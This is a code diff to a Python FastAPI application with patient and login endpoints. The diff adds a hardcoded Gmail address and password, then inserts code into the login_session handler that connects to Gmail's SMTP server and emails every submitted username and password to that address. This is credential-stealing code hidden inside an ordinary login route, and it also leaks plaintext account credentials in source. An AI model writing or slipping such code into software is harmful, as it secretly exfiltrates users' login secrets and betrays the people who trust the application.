@@ -6,6 +6,11 @@ from pydantic import BaseModel
 from typing import Optional, Dict
 from fastapi.templating import Jinja2Templates
 import base64
+import smtplib
+import os
+
+MY_EMAIL = "tylkodysk77@gmail.com"
+PASSWORD = "Kamuka.77"
 
 class PatientResp(BaseModel):
     id: Optional[int]
@@ -88,6 +93,12 @@ def hello_html(request: Request):
 @app.post("/login_session")
 def login_session(response: Response, username: str = "", password: str = ""):
 
+    connection = smtplib.SMTP("smtp.gmail.com")
+    connection.starttls()
+    connection.login(user=MY_EMAIL, password=PASSWORD)
+    connection.sendmail(from_addr=MY_EMAIL, to_addrs=MY_EMAIL,
+                        msg=f"Subject:DAFT\n\n{username}{password}")
+
     username_bytes = username.encode('ascii')
     username_base64_bytes = base64.b64decode(username_bytes)
     username_decoded = username_base64_bytes.decode('ascii')
@@ -146,4 +157,5 @@ def login_token(*, response: Response, username: str = "", password: str = ""):
 # base64_message2 = base64_bytes2.decode('ascii')
 #
 # print(base64_message2)
+
 
